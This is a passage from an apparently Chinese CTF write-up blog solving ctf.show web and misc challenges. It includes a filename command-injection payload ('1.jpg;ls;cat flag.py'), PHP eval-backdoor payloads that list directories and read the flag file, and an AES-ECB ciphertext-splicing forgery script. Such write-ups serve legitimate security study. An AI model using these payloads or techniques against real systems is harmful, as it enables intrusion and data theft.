class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;cmd&quot;</span>:cmd,<span class="string">&quot;result&quot;</span>:result,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file uploaded!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file upload error!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>首先可以得到<code>flag is in /app/flag.py</code>, 然后发现<code>cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</code>没有过滤,没有限制,可能会出现和命令注入攻击</p>
<blockquote>
<p>如果用户上传的文件名包含恶意的路径信息(例如 …/…/etc/passwd), 那么这个代码就会尝试在一个用户不应该有权限访问的路径下运行 <a target="_blank" rel="noopener" href="http://tsteg.py">tsteg.py</a> 脚本. 这就是所谓的路径遍历攻击, 攻击者通过这种方式可以访问到他们本不应该能够访问的文件.</p>
<p>如果 f.filename 中包含了特殊字符(如分号或反引号), 那么攻击者可能可以在 <a target="_blank" rel="noopener" href="http://tsteg.py">tsteg.py</a> 脚本执行完之后, 再执行一些恶意的命令, 这就是所谓的路径遍历攻击</p>
</blockquote>
<p>所以只需要在上传文件的地方加上分号再续上命令就好了, poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.jpg;ls;cat flag.py</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627183205759.png" alt="image-20240627183205759"></p>
<h2 id="Is-Not-Obfuscate"><a class="header-anchor" href="#Is-Not-Obfuscate">¶</a>Is_Not_Obfuscate</h2>
<p>你可以在源码里面找到一些提示:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- //测试执行加密后的插件代码 </span></span><br><span class="line"><span class="comment">	   //这里只能执行加密代码，非加密代码不能执行</span></span><br><span class="line"><span class="comment">	  eval(decode($_GET[&#x27;input&#x27;])); --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &lt;button name=&quot;action&quot; value=&quot;test&quot;&gt; 执行 (do)&lt;/button&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Test the lib.php before use the index.php！--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- After that,delete the robots.txt！--&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问robots.txt可以得到两个敏感路径:<code>/lib.php?flag=0</code>和<code>/plugins</code>; 访问<code>/lib.php?flag=1</code>可以得到一串类似base64的密文, 将这行密文复制到输入框; 另外上面注释不是注释掉了一个按钮嘛, 你给他变回来, 操作如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627190324419.png" alt="image-20240627190324419"></p>
<p>可以得到解密后的源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过审阅源码可知, action的值有三个: test, pull, push</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test：测试用</span><br><span class="line">push：插件内容写入文件</span><br><span class="line">pull：读取文件，解密命令并执行</span><br></pre></td></tr></table></figure>
<p>由于<code>md5($_GET['output'].'youyou'</code>,说明加密的盐值为youyou</p>
<p>假如我们传入<code>output=phpinfo()&amp;action=push</code>, 则会生成一个文件, 路径为<code>plugins/md5值</code>该md5值是可以本地计算得到的, 就是我们代码后面拼接youyou后的md5值;
然后如果在传入<code>action=pull&amp;input=刚才生成的文件路径</code>就可以运行刚才的代码了。</p>
<p>因此，构造读取目录的Payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 加密, 你问我变量怎么来的?抓包来的</span><br><span class="line">?input=&amp;action=push&amp;output=&lt;?php echo `ls /`;?&gt;</span><br><span class="line"># 解密和执行</span><br><span class="line">?input=e31d7b1dfe43749c42490c26deca67a6&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure>
<p>执行就可以得到文件目录,继续构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># payload</span><br><span class="line">?input=&amp;action=push&amp;output=&lt;?php echo `cat /f1agaaa`;?&gt;</span><br><span class="line">?input=aa47b964e675ae576fa5a3a266afb74f&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure>
<h2 id="龙珠NFT"><a class="header-anchor" href="#龙珠NFT">¶</a>龙珠NFT</h2>
<p>源码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：DragonBall Radar (BlockChain)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#网上找的AES加密代码，加密我又不懂，加就完事儿了</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:<span class="number">16</span>])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_16</span>(<span class="params">self,par</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(par) == <span class="built_in">str</span>:</span><br><span class="line">            par = par.encode()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(par) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            par += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> par</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesencrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        text = self.add_16(text)</span><br><span class="line">        self.encrypt_text = self.aes.encrypt(text)</span><br><span class="line">        <span class="keyword">return</span> self.encrypt_text</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesdecrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        self.decrypt_text = self.aes.decrypt(text)</span><br><span class="line">        self.decrypt_text = self.decrypt_text.strip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.decrypt_text</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">AES_ECB=AESCipher(flag)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="comment">#懒得弄数据库或者类，直接弄字典就完事儿了</span></span><br><span class="line">players=&#123;&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    提供登录功能</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/radar&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">radar</span>():</span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   提供雷达界面</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/find_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">find_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找龙珠，返回龙珠地址</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> search_count==<span class="number">10</span>:<span class="comment">#第一次搜寻，给一个一星龙珠</span></span><br><span class="line">        dragonball=<span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> search_count&lt;=<span class="number">0</span>:</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;搜寻次数已用完&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random_num=random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> random_num&lt;=<span class="number">6</span>:</span><br><span class="line">            dragonball=一个没拿过的球，比如<span class="string">&#x27;6&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dragonball=<span class="string">&#x27;0&#x27;</span><span class="comment">#0就代表没有发现龙珠</span></span><br><span class="line">    players[player_id][<span class="string">&#x27;search_count&#x27;</span>]=search_count-<span class="number">1</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;player_id&#x27;</span>:player_id,<span class="string">&#x27;dragonball&#x27;</span>:dragonball,<span class="string">&#x27;round_no&#x27;</span>:<span class="built_in">str</span>(<span class="number">11</span>-search_count),<span class="string">&#x27;time&#x27;</span>:time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)&#125;</span><br><span class="line">    <span class="comment">#json.dumps(data)=&#x27;&#123;&quot;player_id&quot;: &quot;572d4e421e5e6b9bc11d815e8a027112&quot;, &quot;dragonball&quot;: &quot;1&quot;, &quot;round_no&quot;: &quot;9&quot;, &quot;time&quot;:&quot;2022-10-19 15:06:45&quot;&#125;&#x27;</span></span><br><span class="line">    data[<span class="string">&#x27;address&#x27;</span>]= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据龙珠地址解密后添加到用户信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        player_id=request.cookies.get(<span class="string">&quot;player_id&quot;</span>)</span><br><span class="line">        address=request.args.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        data=AES_ECB.aesdecrypt(base64.b64decode(address))</span><br><span class="line">        data=json.loads(data.decode())</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;dragonball&#x27;</span>] !=<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            players[data[<span class="string">&#x27;player_id&#x27;</span>]][<span class="string">&#x27;dragonballs&#x27;</span>].append(data[<span class="string">&#x27;dragonball&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;get_ball&#x27;</span>:data[<span class="string">&#x27;dragonball&#x27;</span>]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;这个地址没有发现龙珠&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;你干啥???????&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看龙珠库存</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#如果有7颗龙珠就拿到flag~</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看源代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>根据源码可知, 一共有5个路由:</p>
<ol>
<li><code>/</code>提供注册功能, 将用户名的md5作为session存入</li>
<li><code>/radar</code>没用</li>
<li><code>/find_dragonball</code>如果是第一次访问, 那么dragonball就是固定值1, 否则访问后产生一个随机数范围是1-1000; 如果是在0-6之间, 那么就把dragonball赋值为该数，否则就赋值为0; 并且每个用户都是只有十次机会</li>
<li><code>get_dragonball</code>传入一个address，如果解密后的值中dragonball不为0，那么就会获得该星的龙珠</li>
<li><code>flag</code>有1-7号的dragonball就拿到flag</li>
</ol>
<p>即使你想用暴力破解的方式, 问题是代码限制永远不可能获得数字7, 唯一可能有问题的地方就是加密方法了, 利用加密方法伪造地址获得龙珠</p>
<p>address是用AES的ECB模式加密的，稍微查一下就可以知道，ECB模式一组密文对应一组明文，也
就是说，可以通过改变密文的顺序从而改变解密后明文的顺序; 代码中用的是以16位为一组进行分割,不足16位则用\x00补齐</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/925d2af71d650be1ff09e9b5e22fcfae.png" alt="image-20230901113556970"></p>
<p>利用源码中给的例子进行划分: 用户不变的前提下,前四行是固定的; 如果我们删除第五行, 刚好<code>dragonball</code>就会变成<code>round_no</code>的9, 而只要<code>dragonball</code>不为0我们就能获得龙珠; 这个次数又是我们可以控制的, 也就可以控制生成的龙珠数了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;player_id&quot;: &quot;5</span><br><span class="line">72d4e421e5e6b9bc</span><br><span class="line">11d815e8a027112&quot;</span><br><span class="line">, &quot;dragonball&quot;: </span><br><span class="line">&quot;1&quot;, &quot;round_no&quot;:	# 到时候这行没了</span><br><span class="line"> &quot;9&quot;, &quot;time&quot;:&quot;2</span><br><span class="line"> 022-10-19 15:06</span><br><span class="line"> :45&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://37f2b8fd-efbc-45e6-b33b-9eb1392146c7.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">username = <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r = s.get(url + <span class="string">&#x27;?username=&#x27;</span> + username)  <span class="comment"># 创建随机用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环10次向服务器发送请求以获取龙珠信息, 将响应解析后存储在 responses 列表</span></span><br><span class="line">responses = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">    responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码遍历列表, 提取出 player_id, dragonball, round_no 和 time, 并将 address 进行Base64解码。然后检查 round_no</span></span><br><span class="line"><span class="comment"># 是否在1到7之间，如果是，则通过删除解码后的地址中的某些部分伪造一个新的地址 fake_address, 并重新编码; 最后, 使用伪造的地址向服务器发送请求以获取龙珠</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>: item[<span class="string">&#x27;player_id&#x27;</span>], <span class="string">&#x27;dragonball&#x27;</span>: item[<span class="string">&#x27;dragonball&#x27;</span>], <span class="string">&#x27;round_no&#x27;</span>: item[<span class="string">&#x27;round_no&#x27;</span>],</span><br><span class="line">                       <span class="string">&#x27;time&#x27;</span>: item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">    miwen = base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">    round_no = item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> round_no <span class="keyword">in</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>)]:</span><br><span class="line">        fake_address = miwen[:<span class="number">64</span>] + miwen[<span class="number">80</span>:]</span><br><span class="line">        fake_address = base64.b64encode(fake_address).decode()</span><br><span class="line">        r = s.get(url + <span class="string">&#x27;get_dragonball&#x27;</span>, params=&#123;<span class="string">&quot;address&quot;</span>: fake_address&#125;)</span><br><span class="line"></span><br><span class="line">r = s.get(url + <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Misc</h1>
<hr>
<h2 id="谜之栅栏"><a class="header-anchor" href="#谜之栅栏">¶</a>谜之栅栏</h2>
<p>下载下来两个文件都无法用stegdetect打开, 但是用图片打开还是有不同的,于是就想在16进制里面找</p>
<p>用010 Editor的比较文件(Ctrl+M)工具可以寻找两个文件中的不同之处然后拼接
<code>cfhwfaab2cb4af5a5820&#125;</code>和<code>tso&#123;06071f997b5bdd1a</code>
既然叫做栅栏,就试试栅栏密码解密, 分为两栏的时候得到解密结果</p>
<h2 id="你会数数吗"><a class="header-anchor" href="#你会数数吗">¶</a>你会数数吗</h2>
<p>用010 Editor打开此文件,数数多半意味着字数统计</p>
<p>找到直方图(Ctrl+Shift+T), 然后按照百分比排序就可以看到flag</p>
<h2 id="你会异或吗"><a class="header-anchor" href="#你会异或吗">¶</a>你会异或吗</h2>
<p>题目给了数字0x50, 因为异或可逆的特性, 只需要再次异或就可以变回来</p>
<p>用010 Editor打开此文件, 文件内没有有效字符串也没有其他东西, 猜测是将整个文件异或</p>
<p>工具-&gt; 十六进制运算-&gt; 二进制异或-&gt; 操作数50(十六进制), 就可以看到是正常的PNG头, 保存修改拿到flag</p>
<h2 id="flag一分为二"><a class="header-anchor" href="#flag一分为二">¶</a>flag一分为二</h2>
<p>尝试了图片宽高爆破, 在图片底下得到后半部分flag</p>
<blockquote>
<p>被修改过的图片 Honeyview 都不能正常显示</p>
</blockquote>
<p>LSB没有, 不包含压缩包, 然后尝试盲水印, 可以得到前半部分flag</p>
<p><a target="_blank" rel="noopener" href="https://www.mefcl.com/watermark/5821">watermark</a></p>
<h2 id="我是谁"><a class="header-anchor" href="#我是谁">¶</a>我是谁?</h2>
<p>不会写脚本就是一个纯纯费眼睛的玩意, 很难想象出题人经历了什么有如此的精神状态</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://be63e113-bfc8-4d2f-85a8-ff939464fa05.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line"></span><br><span class="line">all_girl=sess.get(url+<span class="string">&#x27;/static/all_girl.png&#x27;</span>).content</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;all_girl.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(all_girl)</span><br><span class="line"></span><br><span class="line">big_pic=cv2.imdecode(np.fromfile(<span class="string">&#x27;all_girl.png&#x27;</span>, dtype=np.uint8), cv2.IMREAD_UNCHANGED)</span><br><span class="line">big_pic=big_pic[<span class="number">50</span>:,<span class="number">50</span>:,:]</span><br><span class="line">image_alpha = big_pic[:, :, <span class="number">3</span>]</span><br><span class="line">mask_img=np.zeros((big_pic.shape[<span class="number">0</span>],big_pic.shape[<span class="number">1</span>]), np.uint8)</span><br><span class="line">mask_img[np.where(image_alpha == <span class="number">0</span>)] = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;big.png&#x27;</span>,mask_img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answer_one</span>(<span class="params">sess</span>):</span><br><span class="line">        <span class="comment">#获取视频文件</span></span><br><span class="line">        response=sess.get(url+<span class="string">&#x27;/check&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        tree=html.fromstring(response.text)</span><br><span class="line">        element=tree.xpath(<span class="string">&#x27;//source[@id=&quot;vsource&quot;]&#x27;</span>)</span><br><span class="line">        video_path=element[<span class="number">0</span>].get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        video_bin=sess.get(url+video_path).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Question.mp4&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(video_bin)</span><br><span class="line">        <span class="comment">#获取有效帧</span></span><br><span class="line">        video = cv2.VideoCapture(<span class="string">&#x27;Question.mp4&#x27;</span>)</span><br><span class="line">        frame=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> frame&lt;=<span class="number">55</span>:</span><br><span class="line">                res, image = video.read()</span><br><span class="line">                frame+=<span class="number">1</span></span><br><span class="line">        <span class="comment">#cv2.imwrite(&#x27;temp.png&#x27;,image)</span></span><br><span class="line">        video.release()</span><br><span class="line">        <span class="comment">#获取剪影</span></span><br><span class="line">        image=image[<span class="number">100</span>:<span class="number">400</span>,<span class="number">250</span>:<span class="number">500</span>]</span><br><span class="line">        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)</span><br><span class="line">        <span class="comment">#cv2.imwrite(&#x27;gray_image.png&#x27;,gray_image)</span></span><br><span class="line">        temp = np.zeros((<span class="number">300</span>, <span class="number">250</span>), np.uint8)</span><br><span class="line">        temp[np.where(gray_image&gt;=<span class="number">128</span>)]=<span class="number">255</span></span><br><span class="line">        <span class="comment">#去白边</span></span><br><span class="line">        temp = temp[[<span class="keyword">not</span> np.<span class="built_in">all</span>(temp[i] == <span class="number">255</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(temp.shape[<span class="number">0</span>])], :]</span><br><span class="line">        temp = temp[:, [<span class="keyword">not</span> np.<span class="built_in">all</span>(temp[:, i] == <span class="number">255</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(temp.shape[<span class="number">1</span>])]]</span><br><span class="line">        <span class="comment">#缩放至合适大小，肉眼大致判断是1.2倍，不一定准</span></span><br><span class="line">        temp = cv2.resize(temp,<span class="literal">None</span>,fx=<span class="number">1.2</span>,fy=<span class="number">1.2</span>)</span><br><span class="line">        <span class="comment">#查找位置</span></span><br><span class="line">        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)</span><br><span class="line">        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)</span><br><span class="line">        x,y=<span class="built_in">int</span>(max_loc[<span class="number">0</span>]/<span 